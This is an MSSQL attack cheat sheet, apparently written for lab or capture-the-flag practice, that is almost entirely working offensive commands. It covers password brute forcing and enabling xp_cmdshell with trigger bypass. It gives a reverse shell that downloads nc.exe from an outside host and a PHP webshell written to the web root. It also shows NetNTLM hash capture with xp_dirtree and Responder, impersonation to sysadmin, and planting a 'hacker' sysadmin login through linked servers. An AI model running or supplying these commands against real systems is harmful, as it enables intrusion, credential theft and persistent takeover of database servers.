
## Reconnaissance

### Nmap Script Scanning

Comprehensive MSSQL enumeration:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
  -sV -p 1433 10.10.10.10
```

### Metasploit Discovery
```bash
use auxiliary/scanner/mssql/mssql_ping
set rhosts 10.10.10.10
run
```

**Expected output**:
```
[+] ServerName      = SQL-01
[+] InstanceName    = MSSQLSERVER
[+] Version         = 15.0.2000.5
[+] tcp             = 1433
```

---

## Credential Attacks

### Hydra
```bash
hydra -L users.txt -P passwords.txt 10.10.10.10 mssql
```

### Medusa
```bash
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M mssql
```

### Metasploit
```bash
use auxiliary/scanner/mssql/mssql_login
set rhosts 10.10.10.10
set user_file users.txt
set pass_file passwords.txt
set stop_on_success true
run
```

### Nmap
```bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.10
```

---

## Client Tools

### Impacket - mssqlclient.py

**SQL Server Authentication:**
```bash
mssqlclient.py username:password@10.10.10.10
```

**Windows Authentication:**
```bash
mssqlclient.py DOMAIN/username:password@10.10.10.10 -windows-auth
```

**Local Account (specific syntax):**
```bash
mssqlclient.py SERVERNAME\\username:password@10.10.10.10 -windows-auth
# or
mssqlclient.py .\\username:password@10.10.10.10 -windows-auth
```

### sqsh (Linux)
```bash
sqsh -S 10.10.10.10 -U username -P password
sqsh -S 10.10.10.10 -U .\\username -P password -h
```

### sqlcmd (Windows/Linux)
```bash
sqlcmd -S 10.10.10.10 -U username -P password
```

### DBeaver (GUI)
```bash
# Snap installation
sudo snap install dbeaver-ce
```

Cross-platform database management tool with MSSQL support.

---

## System Databases

| Database | Purpose |
|----------|---------|
| `master` | System-wide configuration and metadata |
| `model` | Template for new databases |
| `msdb` | SQL Server Agent job scheduling |
| `tempdb` | Temporary object storage |
| `resource` | Read-only system objects |

---

## Post-Authentication Enumeration

### List Databases
```sql
SELECT name FROM master.dbo.sysdatabases;
```

### Switch Database Context
```sql
USE DatabaseName;
```

### List Tables
```sql
SELECT * FROM INFORMATION_SCHEMA.TABLES;
```

### Query Data
```sql
SELECT * FROM dbo.table_name;
```

---

## Command Execution via xp_cmdshell

### Check if Enabled
```sql
EXEC xp_cmdshell 'whoami';
```

### Enable xp_cmdshell
```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Impacket shortcut:**
```bash
SQL> enable_xp_cmdshell
```

### Bypass Trigger Protection

If triggers block xp_cmdshell:
```sql
-- Identify triggers
SELECT name FROM sys.server_triggers;

-- Disable trigger
DISABLE TRIGGER trigger_name ON ALL SERVER;

-- Enable xp_cmdshell
enable_xp_cmdshell
```

### Execute Commands
```sql
xp_cmdshell 'whoami /priv';
```

### Reverse Shell
```sql
xp_cmdshell 'powershell wget http://10.10.14.3/nc.exe -OutFile c:\Users\Public\nc.exe';
xp_cmdshell 'c:\Users\Public\nc.exe -e cmd.exe 10.10.14.3 4444';
```

---

## File Operations

### Write Files

**Enable OLE Automation:**
```sql
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

**Create webshell:**
```sql
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
```

### Read Files
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
```

**Impacket:**
```bash
SQL> SELECT * FROM OPENROWSET(BULK 'C:\Users\user\Desktop\flag.txt', SINGLE_CLOB) as data;
```

---

## Credential Theft

### Capture NetNTLM Hash

**Start Responder:**
```bash
responder -I tun0
```

**Force authentication:**
```sql
EXEC master..xp_dirtree '\\10.10.14.3\share\';
```

**Alternative methods:**
```sql
EXEC master..xp_subdirs '\\10.10.14.3\share\';
```

**Crack captured hash:**
```bash
hashcat -m 5600 hash.txt wordlist.txt
```

### Metasploit Method
```bash
use auxiliary/admin/mssql/mssql_ntlm_stealer
set SMBPROXY 10.10.14.3  # Use IP, not interface
set rhosts 10.10.10.10
run
```

---

## Privilege Escalation

### Identify Impersonation Targets
```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

### Check Current Privileges
```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

**Output `0` = not sysadmin, `1` = sysadmin**

### Impersonate User
```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

**Important**: Run impersonation in `master` database for maximum compatibility.

---

## Linked Server Exploitation

### Discover Linked Servers
```sql
SELECT srvname, isremote FROM sysservers;
```

**Values**: `1` = remote server, `0` = linked server

### Execute on Linked Server
```sql
EXECUTE('SELECT @@servername, @@version') AT [LINKED_SERVER];
```

### Enable xp_cmdshell on Linked Server
```sql
EXECUTE('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [LINKED_SERVER];
EXECUTE('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LINKED_SERVER];
```

### Command Execution via Link
```sql
EXECUTE('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

### Nested Linked Server Queries
```sql
SELECT * FROM OPENQUERY("SERVER1", 'SELECT * FROM OPENQUERY("SERVER2", ''SELECT @@version'')');
```

### Create Administrative User
```sql
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssw0rd!'''' '') AT "SERVER1"') AT "SERVER2";
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''', ''''sysadmin'''' '') AT "SERVER1"') AT "SERVER2";
```

---

## PowerUpSQL Automation

### Discovery
```powershell
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

### Information Gathering
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

### Linked Server Enumeration
```powershell
Get-SQLServerLinkCrawl -Instance mssql-srv -Verbose
```

### Remote Execution
```powershell
Get-SQLServerLinkCrawl -Instance mssql-srv -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget target-srv
```

---

## Advanced Techniques

### Python Script Execution
```sql
EXEC sp_execute_external_script 
  @language = N'Python', 
  @script = N'import os; os.system("whoami")';
```

### Unicode Collation Bypass

Certain MSSQL collations treat Unicode characters as equivalent to ASCII, enabling authentication bypasses:
```bash
curl -X POST http://target/login -d "email=💩&password=foo"
```

**Result**: May authenticate as legitimate user due to collation normalization.

---

## Automated Tools

### SQLRecon
```bash
# Windows authentication
SQLRecon.exe -a Windows -s SQL01 -d master -m whoami

# SQL authentication
SQLRecon.exe -a Local -s SQL01 -d master -u sa -p Password -m databases
```

### mssql-spider
Python-based automated exploitation framework for MSSQL environments.

### MSSqlPwner
Comprehensive MSSQL post-exploitation toolkit.

---

## NetExec Modules

**RID Bruteforcing:**
```bash
nxc mssql 10.10.10.10 -u user -p pass --rid-brute
```

**MSSQL Coercion:**
```bash
nxc mssql 10.10.10.10 -u user -p pass -M mssql-coerce
```

**Abuse Trusted Links:**
```bash
nxc mssql 10.10.10.10 -u user -p pass -M mssql-links
```
